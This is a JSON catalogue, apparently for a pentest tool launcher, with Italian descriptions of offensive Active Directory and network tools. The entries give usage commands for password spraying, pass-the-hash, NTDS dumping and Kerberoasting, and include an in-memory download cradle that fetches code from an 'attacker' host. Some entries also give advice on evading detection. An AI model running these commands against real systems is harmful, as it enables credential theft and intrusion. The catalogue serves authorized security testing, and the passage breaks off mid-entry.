[
  {
    "id": "metasploit-pentest-plugin",
    "name": "Pentest-plugin",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/darkoperator/Metasploit-Plugins",
    "desc": "Plugin per Metasploit che automatizza discovery di rete, auto-exploitation da report (Nessus/OpenVAS) e post-exploitation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Il Pentest Plugin di darkoperator è un'estensione essenziale per il framework Metasploit, progettata per accelerare le fasi ripetitive di un penetration test. Permette di importare i report di vulnerabilità da scanner terzi (come Nessus, Qualys, OpenVAS) e tentare automaticamente l'exploitation dei target vulnerabili (<code>auto_exploit</code>). Inoltre, offre comandi avanzati per la discovery di rete e la gestione massiva di sessioni post-exploitation, facilitando il pivoting e la raccolta dati su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Exploitation:</strong> La \"killer feature\" del plugin. Analizza le vulnerabilità importate nel database (db_import) e mappa automaticamente le CVE ai moduli exploit disponibili in Metasploit, lanciandoli contro i target specificati. Include filtri per escludere exploit DoS o instabili.</p><p><strong>Post-Exploitation Massiva:</strong> Comandi come <code>multi_post</code> e <code>multi_meter_cmd</code> permettono di eseguire moduli di post-exploitation o comandi console su tutte le sessioni attive simultaneamente (o su un subset filtrato), riducendo drasticamente il tempo necessario per enumerare credenziali o hash su reti compromesse.</p><p><strong>Project Management:</strong> Migliora la gestione del workflow creando workspace isolati per cliente e salvando automaticamente i log delle attività, essenziale per il reporting professionale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Caricare il plugin nella console msf e importare uno scan.</p><pre><code># Caricamento plugin\nmsf > load pentest\n\n# Importazione report Nessus e auto-exploit\nmsf > db_import scan_results.nessus\nmsf > auto_exploit -match_port -rating high -j\n\n# Esecuzione comando su tutte le sessioni Windows\nmsf > multi_cmd -c \"whoami\" -s Windows</code></pre><p>Richiede una connessione al database postgresql attiva (<code>msfdb init</code>) per funzionare correttamente.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Internal Network Pentest</strong>, dopo aver scansionato una subnet con Nessus, il plugin permette di verificare rapidamente quali vulnerabilità siano realmente sfruttabili (exploit validation) senza configurare manualmente centinaia di moduli. Durante fasi di <strong>Red Teaming</strong>, la gestione centralizzata delle sessioni aiuta a mantenere la situational awareness su molti host compromessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di <code>auto_exploit</code> è estremamente rumoroso (\"Hail Mary attack\") e genererà migliaia di alert su IDS/IPS. Può causare crash di servizi legacy.</p><p><strong>Mitigazioni:</strong> Utilizzare whitelist di host specifici. Preferire l'uso mirato dei comandi post-exploitation su sessioni già stabilite piuttosto che l'auto-exploit indiscriminato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Metasploit_Plugins"
    ],
    "notes": null
  },
  {
    "id": "scipag-vulscan",
    "name": "Vulscan",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/scipag/vulscan",
    "desc": "Modulo NSE per Nmap che converte output di version detection in suggerimenti CVE tramite database offline di vulnerabilità.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Vulscan trasforma il port scanner Nmap in uno strumento di vulnerability assessment preliminare, sfruttando il motore di scripting NSE. A differenza degli scanner attivi tradizionali, Vulscan opera correlando localmente le versioni dei servizi rilevati (fingerprinting) con molteplici database di vulnerabilità offline. Questo approccio permette di identificare potenziali CVE senza inviare pacchetti di exploit o traffico di scansione vulnerabilità specifico verso il target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Correlazione Offline:</strong> La funzione core del tool è il matching testuale tra la stringa di versione del servizio (es. 'Apache 2.4.49') e i record contenuti nei file CSV locali (ExploitDB, CVE, SecurityFocus). Poiché non richiede query online, garantisce totale riservatezza sulle vulnerabilità ricercate e funziona perfettamente in ambienti segregati o air-gapped.</p><p><strong>Supporto Multi-Database:</strong> Vulscan integra nativamente diversi repository di vulnerabilità, inclusi cve.csv, exploitdb.csv e scipvuldb.csv. L'utente può scegliere di interrogare un singolo database per rapidità o tutti simultaneamente per la massima copertura, personalizzando il livello di dettaglio dell'output.</p><p><strong>Integrazione Nmap:</strong> Essendo uno script NSE, beneficia di tutta la flessibilità di Nmap: può essere combinato con opzioni di evasione firewall, timing template e output in vari formati (XML, Grepable), rendendolo facilmente integrabile in pipeline di CI/CD o script di automazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'utilizzo richiede l'installazione dello script nella directory <code>scripts</code> di Nmap e la presenza dei file CSV dei database. Il comando base invoca lo script durante una scansione con detection delle versioni attiva (<code>-sV</code>).</p><pre><code># Scansione con output standard (tutti i DB)\nnmap -sV --script=vulscan/vulscan.nse target.com\n\n# Scansione focalizzata su exploit noti\nnmap -sV --script=vulscan/vulscan.nse --script-args vulscandb=exploitdb.csv target.com</code></pre><p>Per mantenere l'efficacia del tool, è necessario aggiornare regolarmente i file CSV utilizzando lo script <code>update.sh</code> fornito nel repository, poiché Vulscan non scarica definizioni in tempo reale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Triage Iniziale</strong>, Vulscan offre una panoramica rapida dei vettori di attacco più probabili su un perimetro vasto, permettendo di prioritizzare quali host analizzare con scanner più pesanti. In contesti <strong>High Security / Air-Gapped</strong>, dove non è possibile utilizzare scanner cloud-based o che richiedono aggiornamenti online, Vulscan rappresenta una soluzione autonoma ed efficace. Per i <strong>CTF e Red Teaming</strong>, fornisce suggerimenti immediati su exploit pubblici disponibili per i servizi esposti senza il rumore generato da tool come Nessus.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Vulscan in sé è passivo (analizza l'output di Nmap), ma la scansione Nmap sottostante con flag <code>-sV</code> (Version Detection) è attiva e interagisce con i servizi per estrarre i banner. Questo genera log applicativi e traffico di rete riconoscibile.</p><p><strong>Impatto operativo:</strong> Basso rischio di crash dei servizi rispetto a scanner attivi, ma la scansione di versione può essere lenta su grandi range di IP.</p><p><strong>Mitigazioni:</strong> I risultati sono basati sulla versione dichiarata, quindi sono possibili falsi positivi (se le patch sono state backportate) e falsi negativi (se il banner è oscurato). Verificare sempre manualmente le finding prima di lanciare exploit.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Scripts"
    ],
    "notes": null
  },
  {
    "id": "adrecon",
    "name": "ADRecon",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/sense-of-security/ADRecon",
    "desc": "Tool PowerShell per raccolta completa di artefatti Active Directory (trust, GPO, deleghe, utenti privilegiati) con report Excel.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ADRecon è lo strumento definitivo per la fotografia statica dello stato di sicurezza di un ambiente Active Directory. Eseguito con privilegi di utente standard o amministrativi, estrae una mole massiva di informazioni strutturali e di sicurezza dal Domain Controller, consolidandole in un report Excel multipagina. È progettato per facilitare l'identificazione di misconfigurazioni complesse, relazioni di trust e violazioni di best practice senza richiedere agenti permanenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione Olistica:</strong> ADRecon non si limita agli utenti e computer, ma mappa l'intera foresta: relazioni di trust, site e subnet, Group Policy Object (GPO) con relativi link, deleghe Kerberos (Unconstrained/Constrained), e configurazioni LAPS. Questa visibilità completa è cruciale per comprendere la superficie d'attacco reale dell'infrastruttura.</p><p><strong>Analisi GPO e ACL:</strong> Il tool analizza i permessi critici e le impostazioni delle policy, evidenziando chi ha diritti di modifica su oggetti sensibili (es. AdminSDHolder) o quali GPO applicano configurazioni insicure (es. SMB Signing disabilitato). Questo livello di dettaglio aiuta a tracciare percorsi di privilege escalation basati su misconfigurazioni logiche.</p><p><strong>Reporting Strutturato:</strong> Il valore distintivo di ADRecon è l'output: un file Excel autogenerato con fogli separati per ogni categoria di oggetto (Domain Controllers, Users, Groups, GPO, ecc.) e dashboard riassuntive. Questo formato rende i dati immediatamente consumabili sia per analisi tecniche che per presentazioni executive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>ADRecon è uno script PowerShell che può essere eseguito direttamente da un host unito al dominio o tramite <code>runas</code> con credenziali di dominio (es. tramite <code>/netonly</code>). Non richiede installazione, ma necessita del modulo Active Directory o RSAT per funzionalità complete.</p><pre><code># Esecuzione standard con credenziali correnti\nPS C:\\> .\\ADRecon.ps1\n\n# Esecuzione su dominio target specifico con credenziali\nPS C:\\> .\\ADRecon.ps1 -DomainController dc01.corp.local -Credential (Get-Credential)</code></pre><p>L'esecuzione può richiedere diversi minuti a seconda della dimensione del dominio. Al termine, il report viene salvato nella cartella di output con timestamp, pronto per l'analisi offline.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Post-Exploitation Enumeration</strong>, ADRecon viene lanciato dopo aver ottenuto un accesso iniziale per mappare rapidamente il terreno e identificare obiettivi di alto valore (High Value Targets) e percorsi di movimento laterale. Per <strong>Security Assessment e Audit</strong>, fornisce una snapshot auditabile della conformità dell'AD, evidenziando account obsoleti, password policy deboli e trust non necessari. Nelle operazioni di <strong>M&A (Mergers and Acquisitions)</strong>, permette di valutare rapidamente il rischio di sicurezza di un dominio acquisito prima di stabilire trust bidirezionali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> ADRecon genera un volume elevato di query LDAP verso il Domain Controller, che può essere rilevato da soluzioni di monitoraggio (es. Microsoft Defender for Identity) come attività di ricognizione anomala. L'esecuzione scrive file su disco.</p><p><strong>Impatto operativo:</strong> L'estrazione massiva di dati può causare un leggero carico sulla rete e sul DC in ambienti molto grandi, ma raramente causa disservizi.</p><p><strong>Mitigazioni:</strong> Eseguire il tool da una macchina non monitorata o durante finestre di manutenzione. Se possibile, utilizzare tecniche di \"living off the land\" più discrete per query mirate se l'obiettivo è stealth assoluto. Proteggere il report Excel generato poiché contiene la mappa completa della rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "crackmapexec-win",
    "name": "CrackMapExecWin",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/maaaaz/CrackMapExecWin",
    "desc": "Framework post-exploitation multi-protocollo (SMB/WinRM/LDAP) per network sweeping, spraying, esecuzione comandi e attacchi modulari su reti Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CrackMapExec (spesso abbreviato in CME e ora evoluto in NetExec) è il \"coltellino svizzero\" per il pentesting di ambienti Windows/Active Directory. Consente di eseguire azioni massive su intere subnet sfruttando protocolli nativi come SMB, WMI, WinRM e MSSQL. Il tool gestisce automaticamente l'autenticazione, il mantenimento delle sessioni e l'esecuzione di moduli per l'enumerazione, il lateral movement e l'esfiltrazione di dati, mantenendo un database interno degli host compromessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Network Sweeping & Credential Spraying:</strong> CME eccelle nel validare credenziali su larga scala. Può testare una coppia username/password o un hash NTLM (Pass-the-Hash) contro centinaia di host simultaneamente per individuare dove l'utente ha privilegi di accesso o amministrativi (Pwn3d!). Integra meccanismi di controllo per evitare il blocco degli account durante attacchi di password spraying.</p><p><strong>Esecuzione Comandi & Lateral Movement:</strong> Una volta identificati i privilegi amministrativi, il tool permette l'esecuzione remota di comandi cmd o PowerShell tramite metodi multipli (atexec, smbexec, wmiexec), spesso senza caricare binari sul disco target. Facilita il movimento laterale iniettando payload Meterpreter o Cobalt Strike beacon direttamente in memoria.</p><p><strong>Modularità Estensibile:</strong> Il vero potenziale risiede nel sistema di moduli. È possibile eseguire task complessi post-autenticazione come il dump del database SAM (<code>--sam</code>), l'estrazione di credenziali LSA (<code>--lsa</code>), l'enumerazione di sessioni loggate, il controllo delle difese antivirus (<code>enum_avproducts</code>) o l'esecuzione di Mimikatz, tutto automatizzato e parallelo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La sintassi segue lo schema: <code>protocollo target opzioni</code>. È fondamentale specificare le credenziali (in chiaro o hash) e l'azione desiderata.</p><pre><code># Spraying di password su una subnet SMB\ncrackmapexec smb 192.168.1.0/24 -u user.txt -p 'Password123'\n\n# Pass-the-Hash per eseguire comandi (check privilegi Admin)\ncrackmapexec smb 10.0.0.50 -u Administrator -H <NTLM_HASH> -x \"whoami\"\n\n# Dump del database NTDS (richiede Domain Admin)\ncrackmapexec smb dc01.corp.local -u Admin -p Pass --ntds drsuapi</code></pre><p>CME mantiene un database interno (<code>cmedb</code>) che traccia automaticamente quali host sono stati compromessi, permettendo di interrogare rapidamente i risultati senza dover ripetere le scansioni.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante il <strong>Lateral Movement</strong>, CME è lo strumento primario per identificare rapidamente su quali altre macchine le credenziali appena compromesse sono valide, permettendo di espandere l'accesso orizzontalmente. In fase di <strong>Privilege Escalation</strong>, moduli come <code>spider_plus</code> possono cercare file sensibili contenenti password nelle share di rete accessibili. Per l'<strong>Audit delle Password</strong>, permette di verificare la conformità delle policy (es. riutilizzo password local admin) su tutto il parco macchine in pochi secondi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> CME è intrinsecamente rumoroso. Le scansioni su ampi range IP generano traffico SMB/RPC massivo e sequenziale, creando picchi di eventi di \"Logon\" (4624) e \"Logon Failure\" (4625) facilmente correlabili dai SIEM. L'uso di tecniche come <code>psexec</code> lascia artefatti di servizio nei log di sistema.</p><p><strong>Impatto operativo:</strong> Il password spraying mal configurato può causare il blocco massivo degli account utente. L'esecuzione di comandi pesanti su molti host contemporaneamente può saturare la banda o le risorse dei target.</p><p><strong>Mitigazioni:</strong> Utilizzare opzioni di <code>--jitter</code> e <code>--sleep</code> per rallentare le scansioni e renderle meno deterministiche. Preferire protocolli meno monitorati come WinRM rispetto a SMB se possibile. Evitare l'uso di moduli che caricano binari su disco (es. Mimikatz) se è presente un EDR attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "domainpasswordspray",
    "name": "DomainPasswordSpray.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dafthack/DomainPasswordSpray",
    "desc": "Script PowerShell per password spraying su Active Directory con generazione automatica userlist e protezione lockout intelligente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DomainPasswordSpray automatizza una delle tecniche più efficaci per ottenere accesso iniziale: il password spraying. A differenza del brute-force tradizionale, questo tool inverte la logica provando una singola password comune contro tutti gli utenti del dominio. È progettato con una forte enfasi sulla sicurezza operativa (OPSEC), integrando controlli automatici per evitare il blocco degli account utente e l'interruzione dei servizi business-critical.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Userlist Dinamica:</strong> Invece di richiedere liste esterne, lo script interroga direttamente il dominio per ottenere l'elenco aggiornato degli utenti attivi. Filtra automaticamente account disabilitati o che hanno già un conteggio di \"Bad Password\" pericolosamente vicino alla soglia di lockout, proteggendo l'operazione.</p><p><strong>Smart Lockout Avoidance:</strong> Prima di ogni tentativo, verifica la policy delle password del dominio (o le Fine Grained Password Policies se applicabili) per assicurarsi che lo spraying non triggeri blocchi di massa. Include funzionalità di resume per riprendere l'attacco esattamente da dove interrotto in caso di stop.</p><p><strong>Supporto Multi-Protocollo:</strong> Può eseguire la validazione delle credenziali utilizzando diversi metodi, tra cui LDAP (default) o Kerberos Pre-Authentication. Quest'ultimo è spesso preferibile in quanto genera log meno evidenti rispetto a tentativi di login NTLM/LDAP falliti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script deve essere importato in una sessione PowerShell autenticata (anche con utente non privilegiato). L'esecuzione base richiede solo la password da testare.</p><pre><code># Spraying base con una password (es. StagioneAnno)\nInvoke-DomainPasswordSpray -Password \"Estate2024!\"\n\n# Spraying con output su file e lista utenti manuale\nInvoke-DomainPasswordSpray -UserList users.txt -Password \"Password123\" -OutFile spray_results.txt\n\n# Modalità continua con lista password (attesa automatica tra tentativi)\nInvoke-DomainPasswordSpray -PasswordList common_passwords.txt -SleepMinutes 35</code></pre><p>È fondamentale utilizzare il parametro <code>-SleepMinutes</code> quando si testano più password per rispettare la finestra di reset del contatore dei tentativi falliti (solitamente 30 minuti).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Initial Access</strong> interna, quando si possiede un dispositivo nella rete ma nessuna credenziale valida, lo spraying permette spesso di compromettere il primo account utente sfruttando password deboli. In fase di <strong>Lateral Movement</strong>, può essere usato per identificare se le credenziali di un account compromesso sono condivise su altri profili (password reuse). Per i <strong>Blue Team</strong>, è uno strumento essenziale per audit periodici della robustezza delle password degli impiegati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Anche se attento, lo spraying genera un volume elevato di eventi 4625 (Logon Failed) o 4771 (Kerberos Pre-Auth Failed) in un breve lasso di tempo. I SIEM moderni rilevano facilmente il pattern \"singola sorgente, molti target falliti\".</p><p><strong>Impatto operativo:</strong> Se la policy di lockout è configurata male o lo stato del dominio non è sincronizzato, esiste il rischio residuo di bloccare account legittimi. Verificare sempre la policy prima di lanciare.</p><p><strong>Mitigazioni:</strong> Eseguire lo spray in modalità \"low and slow\" (una password al giorno o ogni ora). Se possibile, ruotare l'indirizzo IP sorgente o utilizzare host multipli per distribuire il carico di eventi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "getuserspns-windows",
    "name": "GetUserSPNs_windows.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/maaaaz/impacket-examples-windows",
    "desc": "Tool Impacket per esecuzione attacco Kerberoasting: enumera SPN e richiede ticket TGS cifrati per cracking password offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GetUserSPNs è l'implementazione compilata per Windows del celebre script Python di Impacket, strumento cardine per l'attacco di Kerberoasting. Permette a qualsiasi utente autenticato nel dominio di richiedere i Service Principal Names (SPN) associati agli account di servizio e di ottenere i relativi ticket TGS (Ticket Granting Service). Questi ticket, cifrati con la password dell'account di servizio, possono essere estratti e attaccati offline per rivelare le credenziali in chiaro senza interagire ulteriormente con il target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione SPN:</strong> Il tool scansiona la directory Active Directory alla ricerca di account utente configurati come service account (che possiedono un attributo `servicePrincipalName`). Questo permette di identificare rapidamente target di alto valore come account SQL, IIS o di backup.</p><p><strong>Richiesta TGS (Kerberoasting):</strong> Una volta identificati gli account, invia richieste legittime al KDC per ottenere i ticket di servizio. Il KDC risponde con un ticket cifrato che contiene, nella sua struttura, materiale crittografico derivato dalla password dell'account target.</p><p><strong>Formattazione Hash:</strong> L'output può essere salvato in formati compatibili con i principali password cracker (Hashcat e John the Ripper), facilitando il passaggio immediato alla fase di cracking offline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il tool viene eseguito da riga di comando. Se eseguito da una macchina in dominio con sessione utente attiva, non richiede credenziali; altrimenti, accetta username e password/hash.</p><pre><code># Enumerazione e richiesta ticket (output a video)\nGetUserSPNs.exe -request -dc-ip 192.168.1.10 domain.local/user\n\n# Salvataggio ticket formattati per Hashcat\nGetUserSPNs.exe -request -dc-ip 192.168.1.10 -outputfile hashes.txt domain.local/user\n\n# Autenticazione Pass-the-Hash\nGetUserSPNs.exe -request -hashes :ntlm_hash domain.local/user</code></pre><p>I file generati possono essere crackati con Hashcat usando il modulo 13100: <code>hashcat -m 13100 hashes.txt wordlist.txt</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Kerberoasting è la tecnica standard per l'<strong>Escalation dei Privilegi</strong> in ambiente AD. Spesso gli account di servizio hanno privilegi amministrativi (es. Domain Admins o Local Admins su server critici) e password deboli o mai ruotate. È efficace anche per stabilire <strong>Persistenza</strong>: una volta ottenuta la password di un service account, l'attaccante può generare Silver Ticket per accedere ai servizi specifici senza lasciare tracce sul Domain Controller.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La richiesta di ticket TGS per servizi con cifratura RC4 (obsoleta) è un indicatore forte (Event ID 4769). Richieste multiple di TGS in rapida successione da un singolo host sono facilmente rilevabili da Defender for Identity.</p><p><strong>Impatto operativo:</strong> L'attacco è passivo sui sistemi target (non causa crash), ma genera traffico verso il DC.</p><p><strong>Mitigazioni:</strong> Utilizzare service account gMSA (Managed Service Accounts) con password complesse e rotazione automatica. Monitorare l'uso della cifratura RC4 in Kerberos.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "group3r",
    "name": "Group3r",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Group3r/Group3r",
    "desc": "Motore di analisi GPO che identifica misconfigurazioni exploitable, credenziali in chiaro e permessi di scrittura pericolosi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Group3r è uno strumento specializzato nell'analisi offensiva delle Group Policy Object (GPO). A differenza dei tool di audit generici, Group3r si concentra esclusivamente su configurazioni errate che possono essere sfruttate attivamente da un attaccante per elevare i privilegi o persistere nella rete. Analizza file system (SYSVOL), attributi AD e contenuti delle policy per trovare \"aghi nel pagliaio\" come password decifrabili, script modificabili o assegnazioni di diritti rischiosi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Rilevamento Credenziali:</strong> Cerca attivamente rimasugli di Group Policy Preferences (GPP) contenenti password \"cpassword\" (decifrabili staticamente) e scansiona script di logon/startup alla ricerca di credenziali hardcoded o file di configurazione sensibili distribuiti via GPO.</p><p><strong>Analisi Permessi GPO:</strong> Verifica le Access Control List (ACL) degli oggetti GPO per identificare se l'utente corrente (o un gruppo di cui fa parte) ha diritti di scrittura. Modificare una GPO permette di eseguire codice su tutti i computer o utenti a cui la policy è applicata.</p><p><strong>Controllo Integrità SYSVOL:</strong> Controlla se i file fisici delle policy residenti nella share SYSVOL sono scrivibili da utenti non privilegiati, un vettore comune per inserire backdoor negli script di avvio aziendali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Group3r deve essere eseguito da un host unito al dominio. Non richiede privilegi amministrativi per la maggior parte delle operazioni di lettura.</p><pre><code># Analisi completa con output su file HTML e JSON\n.\\group3r.exe -f report.html -o json\n\n# Analisi focalizzata solo su finding ad alto impatto\n.\\group3r.exe -s High\n\n# Inclusione di dati SYSVOL (richiede accesso alla share)\n.\\group3r.exe --sysvol</code></pre><p>L'output colorato in console aiuta a identificare immediatamente le criticità, mentre il report HTML fornisce dettagli tecnici e comandi per verificare o sfruttare le vulnerabilità trovate.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Privilege Escalation</strong>, Group3r rivela percorsi non ovvi: ad esempio, scoprire che il gruppo \"HelpDesk\" può modificare la GPO \"Default Domain Policy\" garantisce il controllo totale sul dominio. In attività di <strong>Post-Exploitation</strong>, permette di mappare dove vengono distribuiti software o configurazioni, facilitando il movimento laterale verso target specifici. Per i <strong>Defense Team</strong>, aiuta a sanare debiti tecnici storici nelle configurazioni AD.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'analisi comporta una lettura intensiva di oggetti AD e file su SYSVOL. Anche se il traffico è legittimo (lettura policy), il volume e la velocità possono insospettire sistemi di monitoraggio comportamentale.</p><p><strong>Impatto operativo:</strong> Minimo, essenzialmente operazioni di lettura. L'accesso a SYSVOL è traffico SMB standard.</p><p><strong>Mitigazioni:</strong> Eseguire il tool localmente e off-line se possibile (esportando prima i dati) o rallentare l'esecuzione. Non tentare l'exploit automatico delle GPO trovate senza autorizzazione esplicita, poiché l'impatto è globale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "inveigh-exe",
    "name": "Inveigh.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Kevin-Robertson/Inveigh",
    "desc": "Spoofer e Man-in-the-Middle framework .NET per cattura hash e NTLM relay su reti Windows (LLMNR/mDNS/NBNS).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Inveigh (versione C#/.NET) è l'evoluzione del celebre script PowerShell, progettato per eseguire attacchi Man-in-the-Middle (MITM) e spoofing su reti locali Windows. Intercettando richieste di risoluzione nomi multicast/broadcast (LLMNR, NBT-NS, mDNS), inganna i client vittime facendosi passare per le risorse cercate. Questo permette di catturare hash NetNTLMv1/v2 o di eseguire attacchi di relay verso altri servizi, il tutto da un binario autonomo che non richiede PowerShell.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Spoofing Multiprotocollo:</strong> Risponde a richieste LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) e mDNS. Supporta anche lo spoofing DHCPv6 per attacchi su reti IPv6, spesso trascurate dai difensori ma abilitate di default.</p><p><strong>Listener Integrati:</strong> Include server rogue per SMB, HTTP/HTTPS, DNS e LDAP. Questi listener catturano le negoziazioni di autenticazione in arrivo dai client dirottati, registrando credenziali e hash per il cracking.</p><p><strong>NTLM Relay:</strong> Invece di limitarsi a catturare gli hash, Inveigh può inoltrarli in tempo reale verso altri target validi (SMB Relay) per eseguire comandi o ottenere accesso non autorizzato, coordinandosi con tecniche di cross-protocol relay.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'interfaccia a riga di comando è interattiva e offre controllo granulare. Richiede privilegi elevati (Amministratore/SYSTEM) per aprire socket raw e porte privilegiate (445, 80, 53).</p><pre><code># Avvio base (Spoofing LLMNR/mDNS, Listener SMB/HTTP)\nInveigh.exe\n\n# Avvio con parametri specifici (IP spoofing, disabilita NBNS)\nInveigh.exe -IP 192.168.1.50 -NBNS N\n\n# Modalità sola analisi (senza spoofing attivo)\nInveigh.exe -Inspect</code></pre><p>Durante l'esecuzione, premere <code>ESC</code> per entrare nella console di gestione e visualizzare le catture in tempo reale con comandi come <code>GET NTLMV2</code> o <code>GET USERS</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Inveigh è fondamentale nelle fasi iniziali di un <strong>Internal Pentest</strong> per ottenere rapidamente credenziali valide sfruttando il traffico di background della rete. È particolarmente efficace la mattina presto o dopo i riavvii, quando i PC cercano risorse di rete. In scenari di <strong>Red Teaming</strong>, la versione compilata è preferita alla versione PowerShell per evitare le detection AMSI e i log di script block, offrendo maggiore stabilità in lunghe sessioni di ascolto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso a livello di rete. IDS/IPS rilevano facilmente risposte non sollecitate o anomale ai protocolli broadcast. Defender for Identity segnala attività di spoofing.</p><p><strong>Impatto operativo:</strong> Può causare conflitti IP o malfunzionamenti di rete se configurato male. Il relay SMB può bloccare l'accesso alle risorse legittime per la vittima durante l'attacco.</p><p><strong>Mitigazioni:</strong> Usare whitelist/blacklist per targettizzare solo macchine specifiche. Disabilitare protocolli legacy (NBNS) se non necessari. Limitare la durata dell'attacco.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "inveigh-ps1",
    "name": "Inveigh.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Kevin-Robertson/Inveigh",
    "desc": "Versione PowerShell legacy di Inveigh per attacchi MITM fileless e spoofing LLMNR/NBNS in ambienti con restrizioni sui binari.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Inveigh.ps1 è la versione originale in PowerShell del tool di spoofing. Sebbene la versione EXE sia più performante, lo script PS1 rimane vitale per scenari \"fileless\" o \"living off the land\", dove caricare binari compilati sul disco è impossibile o troppo rischioso. Offre le stesse capacità core di poisoning LLMNR/NBNS e cattura credenziali, eseguendo tutto in memoria all'interno di un processo PowerShell.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Esecuzione Fileless:</strong> Può essere caricato direttamente in memoria (es. tramite download cradle) senza toccare il disco, bypassando controlli antivirus basati su file statici.</p><p><strong>Spoofing & Capture:</strong> Gestisce lo spoofing dei nomi e l'ascolto su protocolli HTTP/SMB per catturare challenge NTLM. Include funzionalità per output formattato compatibile con Hashcat.</p><p><strong>Integrazione Framework:</strong> Essendo uno script, è facilmente integrabile in framework di C2 come Empire o Covenant, o eseguibile tramite sessioni di gestione remota (WinRM) esistenti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Importare il modulo ed invocare la funzione principale. Richiede privilegi amministrativi locale.</p><pre><code># Import ed esecuzione base\nImport-Module .\\Inveigh.ps1\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y\n\n# Esecuzione stealth con download in memoria e timer di stop\nIEX (New-Object Net.WebClient).DownloadString('http://attacker/Inveigh.ps1')\nInvoke-Inveigh -RunTime 10 -Tool 2 -IP 192.168.1.50</code></pre><p>Utilizzare <code>Stop-Inveigh</code> per terminare i job di 